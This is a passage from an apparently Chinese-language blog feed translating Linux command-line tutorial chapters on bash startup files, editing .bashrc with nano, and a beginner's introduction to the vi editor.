<td>PAGER</td>
<td>用于分页输出的程序名称。通常设置为 &#x2F;usr&#x2F;bin&#x2F;less。</td>
</tr>
<tr>
<td>PATH</td>
<td>输入可执行程序名称时搜索的由冒号分隔的目录列表。</td>
</tr>
<tr>
<td>PS1</td>
<td>这代表“提示字符串 1”。这定义了 shell 提示的内容。稍后我们将看到，这可以进行广泛的自定义。</td>
</tr>
<tr>
<td>PWD</td>
<td>当前的工作目录。</td>
</tr>
<tr>
<td>TERM</td>
<td>您的终端类型名称。Unix-like 系统支持许多终端协议；此变量设置要与您的终端模拟器使用的协议。</td>
</tr>
<tr>
<td>TZ</td>
<td>指定您的时区。大多数 Unix-like 系统将计算机的内部时钟维护在<em>协调世界时</em>(UTC)中，然后通过应用此变量指定的偏移量显示本地时间。</td>
</tr>
<tr>
<td>USER</td>
<td>您的用户名。</td>
</tr>
</tbody></table>
<p>如果某些值缺失，不用担心。它们根据发行版而异。</p>
<p><strong>环境是如何建立的？</strong></p>
<p>当我们登录系统时，bash 程序启动，并读取一系列称为 <em>启动文件</em> 的配置脚本，这些脚本定义了所有用户共享的默认环境。接着，我们的主目录中有更多的启动文件，这些文件定义了我们的个人环境。确切的序列取决于启动的 shell 会话类型。有两种类型。</p>
<ul>
<li><strong>登录 shell 会话</strong> 登录 shell 会话是指我们被提示输入用户名和密码的会话。例如，当我们启动一个虚拟控制台会话时会发生这种情况。</li>
<li><strong>非登录 shell 会话</strong> 非登录 shell 会话通常发生在我们在 GUI 中启动终端会话时。</li>
</ul>
<p>登录 shell 会话会读取一个或多个启动文件，如表11-2所示。</p>
<p><em>表11-2：登录 shell 会话的启动文件</em></p>
<table>
<thead>
<tr>
<th><strong>文件</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;profile</td>
<td>适用于所有用户的全局配置脚本。</td>
</tr>
<tr>
<td>~&#x2F;.bash_profile</td>
<td>用户的个人启动文件。这可以用于扩展或覆盖全局配置脚本中的设置。</td>
</tr>
<tr>
<td>~&#x2F;.bash_login</td>
<td>如果没有找到 ~&#x2F;.bash_profile，则 bash 尝试读取此脚本。</td>
</tr>
<tr>
<td>~&#x2F;.profile</td>
<td>如果既没有找到 ~&#x2F;.bash_profile 也没有找到 ~&#x2F;.bash_login，bash 会尝试读取此文件。这是基于 Debian 的发行版，如 Ubuntu 的默认设置。</td>
</tr>
</tbody></table>
<p>非登录 shell 会话会读取表11-3中列出的启动文件。</p>
<p><em>表11-3：非登录 shell 会话的启动文件</em></p>
<table>
<thead>
<tr>
<th><strong>文件</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;bash.bashrc</td>
<td>适用于所有用户的全局配置脚本。</td>
</tr>
<tr>
<td>~&#x2F;.bashrc</td>
<td>用户的个人启动文件。它可以用于扩展或覆盖全局配置脚本中的设置。</td>
</tr>
</tbody></table>
<p>除了读取表11-3中的启动文件外，非登录 shell 会话还从其父进程（通常是登录 shell）继承环境。</p>
<p>查看并查看安装了哪些启动文件。记住 - 由于上述大多数文件名以点开始（表示它们是隐藏的），因此在使用 ls 时，我们需要使用“-a”选项。</p>
<p>对于普通用户来说，~&#x2F;.bashrc 文件可能是最重要的启动文件，因为它几乎总是会被读取。非登录 shell 默认会读取它，大多数登录 shell 的启动文件也是这样编写的，以便读取 ~&#x2F;.bashrc 文件。</p>
<p>启动文件中有什么？</p>
<p>如果我们查看一个典型的 .bash_profile（来自 CentOS 6 系统），它看起来大致如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line"> . ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>以“#”开头的行是<em>注释</em>，shell 不会读取这些行。这些注释是为了人类可读性而存在的。第一件有趣的事情出现在第四行，具体代码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">    . ~/.bashrc</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>这被称为<em>if复合命令</em>，我们将在第四部分的 shell 脚本部分进行详细讨论，但现在，这里是一个翻译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">If the file &quot;~/.bashrc&quot; exists, then</span><br><span class="line">read the &quot;~/.bashrc&quot; file.</span><br></pre></td></tr></table></figure>

<p>我们可以看到，这段代码是登录 shell 获取 .bashrc 内容的方式。接下来在我们的启动文件中的内容与 PATH 变量有关。</p>
<p>你是否曾想过，当我们在命令行中输入命令时，shell 是如何知道在哪里找到这些命令的？例如，当我们输入 <code>ls</code> 时，shell 并不会搜索整台计算机来找到 <code>/bin/ls</code>（ls 命令的完整路径名）；相反，它会搜索 PATH 变量中包含的目录列表。</p>
<p>PATH 变量通常（但并非总是，这取决于发行版）由 &#x2F;etc&#x2F;profile 启动文件设置，具体代码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PATH=$PATH:$HOME/bin</span><br></pre></td></tr></table></figure>

<p>PATH 被修改以在列表的末尾添加目录 $HOME&#x2F;bin。这是参数扩展的一个示例，我们在第7章“看待 shell 视角的世界”中已经提到了这一点。为了演示这是如何工作的，请尝试以下操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=&quot;This is some &quot;</span><br><span class="line">[me@linuxbox ~]$ echo $foo</span><br><span class="line">This is some</span><br><span class="line">[me@linuxbox ~]$ foo=$foo&quot;text.&quot;</span><br><span class="line">[me@linuxbox ~]$ echo $foo</span><br><span class="line">This is some text.</span><br></pre></td></tr></table></figure>

<p>使用这种技术，我们可以将文本追加到变量内容的末尾。</p>
<p>通过将字符串 <code>$HOME/bin 添加到 PATH 变量的内容末尾，当输入命令时，$</code>HOME&#x2F;bin 目录被添加到搜索的目录列表中。这意味着当我们想在家目录内为存储我们自己的私有程序创建一个目录时，shell 已经准备好满足我们的需求。我们所要做的就是叫它 bin，然后我们就可以使用了。</p>
<p><strong>注意</strong>：许多发行版默认提供了这个 PATH 设置。基于 Debian 的发行版，如 Ubuntu，在登录时会检查 ~&#x2F;bin 目录的存在，并在找到该目录时动态地将其添加到 PATH 变量中。</p>
<p>最后，我们有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>export 命令告诉 shell 使 PATH 的内容对此 shell 的子进程可用。</p>
<h3 id="修改环境"><a href="#修改环境" class="headerlink" title="修改环境"></a>修改环境</h3><p>既然我们知道启动文件的位置和它们包含的内容，我们可以修改它们以自定义我们的环境。</p>
<h3 id="我们应该修改哪些文件？"><a href="#我们应该修改哪些文件？" class="headerlink" title="我们应该修改哪些文件？"></a>我们应该修改哪些文件？</h3><p>一般来说，为了向您的 PATH 添加目录或定义其他环境变量，请将这些更改放入 .bash_profile 文件中（或根据您的发行版相应地选择；例如，Ubuntu 使用 .profile）。对于其他所有更改，请将它们放入 .bashrc 中。</p>
<p><strong>注意</strong>：除非您是系统管理员并且需要更改系统所有用户的默认设置，否则请限制您的修改仅限于您的主目录中的文件。当然，您可以更改 &#x2F;etc 中的文件，例如 profile，而且在许多情况下这样做是有道理的，但现在，我们最好保守行事。</p>
<h4 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h4><p>要编辑（即修改）shell 的启动文件以及系统上的大多数其他配置文件，我们使用一个称为<em>文本编辑器</em>的程序。文本编辑器在某种程度上与文字处理器相似，因为它允许我们使用移动的光标在屏幕上编辑文字。与文字处理器不同的是，它只支持纯文本，并经常包含为编写程序而设计的功能。文本编辑器是软件开发人员用来编写代码的核心工具，也是系统管理员用来管理控制系统的配置文件的工具。</p>
<p>Linux 上有很多不同的文本编辑器；大多数系统都安装了几个。为什么有这么多不同的编辑器？因为程序员喜欢编写它们，并且由于程序员广泛使用它们，他们编写编辑器以表达他们对它们应该如何工作的想法。</p>
<p>文本编辑器基本上分为两大类：图形化和基于文本。GNOME 和 KDE 都包括一些流行的图形编辑器。GNOME 配备了一个名为 gedit 的编辑器，通常在 GNOME 菜单中被称为“文本编辑器”。KDE 通常配备了三个，它们是（按复杂性递增的顺序）kedit、kwrite 和 kate。</p>
<p>还有许多基于文本的编辑器。我们将遇到的流行的有 nano、vi 和 emacs。nano 编辑器是一个简单、易于使用的编辑器，设计为 PINE 电子邮件套件中 pico 编辑器的替代品。vi 编辑器（在大多数 Linux 系统上被一个名为 vim 的程序替代，简称为“vi 改进”）是 Unix-like 系统的传统编辑器。它将是我们下一章的主题。emacs 编辑器最初是由 Richard Stallman 编写的。它是一个庞大的、多功能的、能做任何事情的编程环境。尽管它很容易获得，但默认情况下，大多数 Linux 系统上很少安装它。</p>
<h4 id="使用文本编辑器"><a href="#使用文本编辑器" class="headerlink" title="使用文本编辑器"></a>使用文本编辑器</h4><p>可以通过从命令行输入编辑器的名称，后跟我们想要编辑的文件的名称来调用文本编辑器。如果文件尚不存在，编辑器将假定我们想要创建一个新文件。以下是使用 gedit 的示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ gedit some_file</span><br></pre></td></tr></table></figure>

<p>这条命令将启动 gedit 文本编辑器并加载名为“some_file”的文件（如果它存在）。</p>
<p>图形文本编辑器相当直观，所以我们在这里不会详细介绍它们。相反，我们将专注于我们的第一个基于文本的文本编辑器，nano。让我们启动 nano 并编辑 .bashrc 文件。但在这之前，让我们练习一些“安全的计算”。每当我们编辑一个重要的配置文件时，最好首先创建文件的备份副本。这样可以在编辑时保护我们免受出错的风险。要创建 .bashrc 文件的备份，可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cp .bashrc .bashrc.bak</span><br></pre></td></tr></table></figure>

<p>我们可以随意命名备份文件；只需选择一个容易理解的名称。扩展名“ .bak”、“ .sav”、“ .old” 和 “ .orig” 都是表示备份文件的流行方式。哦，还要记住，cp 会<em>默默地覆盖现有文件</em>。</p>
<p>现在我们有了一个备份文件，我们将启动编辑器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ nano .bashrc</span><br></pre></td></tr></table></figure>

<p>一旦 nano 启动，我们将看到如下的屏幕：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> GNU nano 2.0.3 File: .bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">    . /etc/bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line">    [ Read 8 lines ]</span><br><span class="line">^G Get Help^O WriteOut^R Read Fil^Y Prev Pag^K Cut Text^C Cur Pos</span><br><span class="line">^X Exit ^J Justify ^W Where Is^V Next Pag^U UnCut Te^T To Spell</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：如果您的系统没有安装 nano，您可以使用图形编辑器。</p>
<p>屏幕由顶部的标题、中间正在编辑的文件的文本以及底部的命令菜单组成。由于 nano 是为了替代电子邮件客户端提供的文本编辑器而设计的，因此其编辑功能相对较少。</p>
<p>在任何文本编辑器中，我们首先应该学习的命令是如何退出程序。对于 nano，我们按 Ctrl-x 退出。屏幕底部的菜单中指示了这一点。符号 ^X 表示 Ctrl-x。这是许多程序使用的控制字符的常见表示法。</p>
<p>我们需要知道的第二个命令是如何保存我们的工作。对于 nano，这是 Ctrlo。有了这些知识，我们准备好进行一些编辑了。使用下箭头键和&#x2F;或 PageDown 键，将光标移动到文件的末尾，然后向 .bashrc 文件添加以下行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">umask 0002</span><br><span class="line">export HISTCONTROL=ignoredups</span><br><span class="line">export HISTSIZE=1000</span><br><span class="line">alias l.=&#x27;ls -d .* --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=auto&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：您的发行版可能已经包含了其中的一些内容，但重复内容不会有任何问题。</p>
<p>Table 11-4 详细说明了我们所添加的内容的含义：</p>
<p><em>表 11-4：添加到我们的 .bashrc 文件中的内容</em></p>
<table>
<thead>
<tr>
<th><strong>行</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>umask 0002</td>
<td>将umask设置为解决我们在第9章“权限”中讨论的共享目录问题。</td>
</tr>
<tr>
<td>export HISTCONTROL&#x3D;ignoredups</td>
<td>使shell的历史记录功能忽略最近记录的相同命令。</td>
</tr>
<tr>
<td>export HISTSIZE&#x3D;1000</td>
<td>将命令历史记录的大小从通常的默认值500行增加到1,000行。</td>
</tr>
<tr>
<td>alias l.&#x3D;’ls -d .* –color&#x3D;auto’</td>
<td>创建一个名为 l. 的新命令，显示以点开头的所有目录条目。</td>
</tr>
<tr>
<td>alias ll&#x3D;’ls -l –color&#x3D;auto’</td>
<td>创建一个名为 ll 的新命令，显示长格式的目录列表。</td>
</tr>
</tbody></table>
<p>正如我们所看到的，我们的许多添加并不直观，因此最好在我们的 .bashrc 文件中添加一些注释以帮助人们理解。</p>
<p>使用编辑器，更改我们的添加内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change <span class="built_in">umask</span> to make directory sharing easier</span></span><br><span class="line">umask 0002</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ignore duplicates <span class="keyword">in</span> <span class="built_in">command</span> <span class="built_in">history</span> and increase</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">history</span> size to 1000 lines</span></span><br><span class="line">export HISTCONTROL=ignoredups</span><br><span class="line">export HISTSIZE=1000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Add some helpful aliases</span></span><br><span class="line">alias l.=&#x27;ls -d .* --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=auto&#x27;</span><br></pre></td></tr></table></figure>

<p>啊，好多了！完成我们的更改后，按 Ctrl-o 保存修改后的 .bashrc 文件，然后按 Ctrl-x 退出 nano。</p>
<h3 id="为什么注释很重要"><a href="#为什么注释很重要" class="headerlink" title="为什么注释很重要"></a>为什么注释很重要</h3><p>每当修改配置文件时，最好添加一些注释来记录您的更改。当然，您可能会记得自己明天做了什么更改，但六个月后呢？为自己做个好处，添加一些注释。顺便说一句，记下您所做的更改也是个好主意。</p>
<p>Shell脚本和 bash 启动文件使用“#”符号开始注释。其他配置文件可能使用其他符号。大多数配置文件都会有注释。将它们用作指南。</p>
<p>您经常会在配置文件中看到被 <em>注释掉</em> 的行，以防止受影响的程序使用它们。这样做是为了给读者提供可能的配置选择建议或正确配置语法的示例。例如，Ubuntu 18.04 的 .bashrc 文件包含以下行：</p>
<p># 一些更多的 ls 别名<br>#alias ll&#x3D;’ls -l’<br>#alias la&#x3D;’ls -A’<br>#alias l&#x3D;’ls -CF’</p>
<p>最后三行是有效的别名定义，已被注释掉。如果您从这三行中去掉前导的“#”符号，这种技术称为 <em>取消注释</em>，您将激活这些别名。相反，如果在行的开头添加“#”符号，您可以停用一个配置行，同时保留它所包含的信息。</p>
<h4 id="激活我们的更改"><a href="#激活我们的更改" class="headerlink" title="激活我们的更改"></a>激活我们的更改</h4><p>我们对 .bashrc 的更改在关闭终端会话并开始新会话后才会生效，因为 .bashrc 文件只在会话开始时被读取。但是，我们可以使用以下命令强制 bash 重新读取修改后的 .bashrc 文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ source ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>完成此操作后，我们应该能够看到我们更改的效果。尝试使用其中一个新的别名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ll</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这一章中，我们学习了一项重要的技能——使用文本编辑器编辑配置文件。在前进的过程中，当我们阅读命令的 man 页面时，注意命令支持的环境变量。可能会有一两个宝藏。在后面的章节中，我们将学习关于 shell 函数的内容，这是一个强大的功能，您也可以将其包含在 bash 启动文件中，以增加您的自定义命令库。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>bash man 页面的 INVOCATION 部分详细介绍了 bash 启动文件的内容。</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>vi 温柔入门</title>
    <url>/2024/03/12-gentle-introduction-to-vi/</url>
    <content><![CDATA[<h2 id="12-–-vi-温柔入门"><a href="#12-–-vi-温柔入门" class="headerlink" title="12 – vi 温柔入门"></a>12 – vi 温柔入门</h2><p>有一个古老的笑话，描述了一个访问纽约市的游客询问过路人如何到达该城市著名的古典音乐场所的情境：</p>
<p>游客：对不起，我怎样才能到达卡内基音乐厅？</p>
<p>过路人：练习，练习，再练习！</p>
<span id="more"></span>

<p>学习 Linux 命令行，就像成为一个精通的钢琴家，不是我们能在一个下午掌握的技能。这需要多年的实践。在这一章中，我们将介绍 vi（发音为“vee eye”）文本编辑器，这是 Unix 传统中的核心程序之一。vi 因其复杂的用户界面而有些臭名昭著，但当我们看到一个大师坐下来开始“演奏”时，我们确实会见证到一些伟大的艺术。虽然我们在这一章中不会成为大师，但在结束时，我们将知道如何在 vi 中演奏“chopsticks”。</p>
<h3 id="我们为什么应该学习-vi"><a href="#我们为什么应该学习-vi" class="headerlink" title="我们为什么应该学习 vi"></a>我们为什么应该学习 vi</h3><p>在这个拥有图形编辑器和易于使用的文本编辑器（如 nano）的现代时代，为什么我们还要学习 vi 呢？有三个好的理由。</p>
<ul>
<li>vi 几乎总是可用的。如果我们有一个没有图形界面的系统，如远程服务器或本地系统的 X 配置损坏，这将是一个救命稻草。尽管 nano 越来越受欢迎，但仍不普遍。POSIX，Unix 系统上的程序兼容性标准，要求必须存在 vi。</li>
<li>vi 轻量级且快速。对于许多任务，启动 vi 比查找图形文本编辑器并等待其加载多个兆字节更容易。此外，vi 设计用于打字速度。正如我们将看到的，一个熟练的 vi 用户在编辑时从不需要将手指离开键盘。</li>
<li>我们不希望其他 Linux 和 Unix 用户认为我们是懦夫。</li>
</ul>
<p>好吧，也许只有两个好理由。</p>
<h3 id="一点背景"><a href="#一点背景" class="headerlink" title="一点背景"></a>一点背景</h3><p>vi 的第一个版本于 1976 年由 Bill Joy 编写，他是加利福尼亚大学伯克利分校的学生，后来共同创办了 Sun Microsystems。vi 的名称源自“visual”一词，因为它旨在允许在具有移动光标的视频终端上进行编辑。在 <em>visual 编辑器</em> 出现之前，有 <em>line editors</em>，这些编辑器一次只能操作一行文本。要指定更改，我们告诉 line editor 去到特定的行并描述要进行的更改，例如添加或删除文本。随着视频终端（而不是像电传打印机这样的打印机终端）的出现，视觉编辑成为可能。vi 实际上集成了一个强大的 line editor，称为 ex，我们在使用 vi 时可以使用 line editing 命令。</p>
<p>大多数 Linux 发行版并不包括真正的 vi；相反，它们带有一个名为 vim（代表“vi 改进”）的增强版本，由 Bram Moolenaar 编写。vim 是传统 Unix vi 的重大改进，并且通常在 Linux 系统上以符号链接（或别名）的方式与 vi 相关联。在接下来的讨论中，我们将假设我们有一个名为 vi 的程序，实际上是 vim。</p>
<h3 id="启动和停止-vi"><a href="#启动和停止-vi" class="headerlink" title="启动和停止 vi"></a>启动和停止 vi</h3><p>要启动 vi，我们只需输入以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ vi</span><br></pre></td></tr></table></figure>

<p>应该会出现如下的屏幕：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~</span><br><span class="line">~</span><br><span class="line">~ VIM - Vi Improved</span><br><span class="line">~</span><br><span class="line">~ version 8.0.707</span><br><span class="line">~ by Bram Moolenaar et al.</span><br><span class="line">~ Vim is open source and freely distributable</span><br><span class="line">~</span><br><span class="line">~ Sponsor Vim development!</span><br><span class="line">~ type :help sponsor&lt;Enter&gt; for information</span><br><span class="line">~</span><br><span class="line">~ type :q&lt;Enter&gt; to exit</span><br><span class="line">~ type :help&lt;Enter&gt; or &lt;F1&gt; for on-line help</span><br><span class="line">~ type :help version8&lt;Enter&gt; for version info</span><br><span class="line">~</span><br><span class="line">~ Running in Vi compatible mode</span><br><span class="line">~ type :set nocp&lt;Enter&gt; for Vim defaults</span><br><span class="line">~ type :help cp-default&lt;Enter&gt; for info on this</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br></pre></td></tr></table></figure>

<p>就像我们之前使用 nano 一样，学习的第一件事就是如何退出。要退出，我们输入以下命令（请注意，冒号字符是命令的一部分）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:q</span><br></pre></td></tr></table></figure>

<p>应该返回 shell 提示符。如果由于某种原因 vi 无法退出（通常是因为我们对尚未保存的文件进行了更改），我们可以通过在命令后添加感叹号来告诉 vi 我们确实是认真的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:q!</span><br></pre></td></tr></table></figure>

<p>**提示：**如果在 vi 中“迷失”，尝试按两次 Esc 键来重新找到你的位置。</p>
<h3 id="兼容模式"><a href="#兼容模式" class="headerlink" title="兼容模式"></a>兼容模式</h3><p>在上面的示例启动屏幕中，我们看到文本“Running in Vi compatible mode”。这意味着 vim 将以更接近 vi 的正常行为模式运行，而不是 vim 的增强行为。为了本章的目的，我们希望以其增强的行为模式运行 vim。为此，您有几个选项。尝试运行 vim 而不是 vi。如果有效，请考虑在您的 .bashrc 文件中添加别名 <code>vi=&#39;vim&#39;</code>。或者，使用以下命令向您的 vim 配置文件添加一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set nocp&quot;</span> &gt;&gt; ~/.vimrc</span><br></pre></td></tr></table></figure>

<p>不同的 Linux 发行版以不同的方式打包 vim。一些发行版默认安装的是一个最小化版本的 vim，仅支持有限的 vim 功能集。在进行后续的课程时，您可能会遇到缺失的功能。如果是这种情况，请安装完整版本的 vim。</p>
<h3 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h3><p>让我们再次启动 vi，这次给它传递一个不存在的文件名。这是我们如何使用 vi 创建一个新文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rm -f foo.txt</span><br><span class="line">[me@linuxbox ~]$ vi foo.txt</span><br></pre></td></tr></table></figure>

<p>如果一切正常，我们应该会看到这样的屏幕：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">&quot;foo.txt&quot; [New File] </span><br></pre></td></tr></table></figure>

<p>前导的波浪符（~）表示该行上没有文本。这表明我们有一个空文件。<strong>尚未输入任何内容！</strong></p>
<p>关于 vi 的第二重要事项（在学习如何退出之后）是 vi 是一个 <em>模态编辑器</em>。当 vi 启动时，它开始于 <em>命令模式</em>。在这个模式下，几乎每个键都是一个命令，因此如果我们开始输入，vi 基本上会变得混乱，制造大量混乱。</p>
<h4 id="进入插入模式"><a href="#进入插入模式" class="headerlink" title="进入插入模式"></a>进入插入模式</h4><p>要向我们的文件添加一些文本，我们必须首先进入 <em>插入模式</em>。为此，我们按下 i 键。之后，如果 vim 以其通常的增强模式运行，我们应该在屏幕底部看到以下内容（在 vi 兼容模式下不会出现）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-- INSERT --</span><br></pre></td></tr></table></figure>

<p>现在，我们可以输入一些文本。试试这个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>要退出插入模式并返回到命令模式，请按 Esc 键。</p>
<h4 id="保存我们的工作"><a href="#保存我们的工作" class="headerlink" title="保存我们的工作"></a>保存我们的工作</h4><p>要保存我们刚刚对文件所做的更改，我们必须在命令模式下输入一个 <em>ex 命令</em>。通过按 : 键轻松完成此操作。这样做后，屏幕底部应该会出现一个冒号字符：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:</span><br></pre></td></tr></table></figure>

<p>为了写入我们修改过的文件，我们在冒号后面加上 w，然后按 Enter 键。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:w</span><br></pre></td></tr></table></figure>

<p>文件将被写入硬盘，并且我们应该在屏幕底部收到一个确认消息，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;foo.txt&quot; [New] 1L, 46C written</span><br></pre></td></tr></table></figure>

<p>**提示：**如果您阅读 vim 文档，您会注意到（令人困惑的是）命令模式被称为 <em>正常模式</em>，而 ex 命令被称为 <em>命令模式</em>。请注意。</p>
<h3 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h3><p>在命令模式下，vi 提供了大量的移动命令，其中一些与 less 命令共享。表12-1列出了其中的一部分。</p>
<p><em>表 12-1：光标移动键</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>移动光标到</strong></th>
</tr>
</thead>
<tbody><tr>
<td>l 或 右箭头</td>
<td>向右移动一个字符。</td>
</tr>
<tr>
<td>h 或 左箭头</td>
<td>向左移动一个字符。</td>
</tr>
<tr>
<td>j 或 下箭头</td>
<td>向下移动一行。</td>
</tr>
<tr>
<td>k 或 上箭头</td>
<td>向上移动一行。</td>
</tr>
<tr>
<td>0（零）</td>
<td>移动到当前行的开头。</td>
</tr>
<tr>
<td>^</td>
<td>移动到当前行的第一个非空白字符。</td>
</tr>
<tr>
<td>$</td>
<td>移动到当前行的末尾。</td>
</tr>
<tr>
<td>w</td>
<td>移动到下一个单词或标点符号的开头。</td>
</tr>
<tr>
<td>W</td>
<td>移动到下一个单词的开头，忽略标点符号。</td>
</tr>
<tr>
<td>b</td>
<td>移动到前一个单词或标点符号的开头。</td>
</tr>
<tr>
<td>B</td>
<td>移动到前一个单词的开头，忽略标点符号。</td>
</tr>
<tr>
<td>Ctrl-f 或 Page Down</td>
<td>向下翻一页。</td>
</tr>
<tr>
<td>Ctrl-b 或 Page Up</td>
<td>向上翻一页。</td>
</tr>
<tr>
<td><em>数字</em>G</td>
<td>到 <em>数字</em> 行。例如，1G 移动到文件的第一行。</td>
</tr>
<tr>
<td>G</td>
<td>移动到文件的最后一行。</td>
</tr>
</tbody></table>
<p>为什么使用 h、j、k 和 l 键来移动光标？当 vi 最初编写时，并非所有的视频终端都有箭头键，熟练的打字员可以使用普通的键盘键来移动光标，而无需从键盘上抬起手指。</p>
<p>在 vi 中，许多命令都可以使用数字作为前缀，就像上面列出的 “G” 命令一样。通过在命令前加上数字，我们可以指定执行命令的次数。例如，命令 “5j” 会使 vi 向下移动五行。</p>
<h3 id="基本编辑"><a href="#基本编辑" class="headerlink" title="基本编辑"></a>基本编辑</h3><p>大多数编辑操作包括一些基本操作，如插入文本、删除文本和通过剪切和粘贴移动文本。当然，vi 以其独特的方式支持所有这些操作。vi 还提供了一种有限的撤销功能。如果我们在命令模式下按下 “u” 键，vi 将撤销您所做的最后一个更改。当我们尝试一些基本编辑命令时，这将非常有用。</p>
<h4 id="添加文本"><a href="#添加文本" class="headerlink" title="添加文本"></a>添加文本</h4><p>vi 有几种不同的方式进入插入模式。我们已经使用了 i 命令来插入文本。</p>
<p>让我们暂时回到我们的 foo.txt 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>如果我们想在这句话的末尾添加一些文本，我们会发现 i 命令无法做到这一点，因为我们无法将光标移动到行的末尾之后。vi 提供了一个命令来追加文本，其名称合情合理地被命名为 a 命令。如果我们将光标移动到行的末尾并输入 a，光标将超过行的末尾，vi 将进入插入模式。这将允许我们添加更多文本。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumped over the lazy dog. It was cool.</span><br></pre></td></tr></table></figure>

<p>记得按 Esc 键退出插入模式。</p>
<p>由于我们几乎总是希望将文本追加到行的末尾，vi 提供了一个快捷方式，可以移动到当前行的末尾并开始追加。这就是 A 命令。让我们尝试一下，在我们的文件中添加几行文本。</p>
<p>首先，我们将使用 “0”（零）命令将光标移动到行的开头。现在，我们输入 A 并添加以下文本行：</p>
